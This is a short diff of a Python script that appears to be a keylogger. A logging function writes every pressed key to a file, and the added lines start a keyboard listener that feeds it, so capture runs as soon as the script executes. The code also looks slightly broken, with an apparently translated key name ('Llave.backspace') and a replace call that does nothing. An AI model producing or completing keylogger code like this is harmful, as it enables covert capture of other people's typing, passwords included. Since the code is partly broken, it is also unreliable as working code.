@@ -21,4 +21,7 @@ def registro(llave):
     elif llave == 'Llave.backspace':
         p.write('%BORRAR')
     else:
-        p.write(llave.replace("",""))    
+        p.write(llave.replace("",""))
+
+with Listener(on_press=registro) as u:
+    u.join()
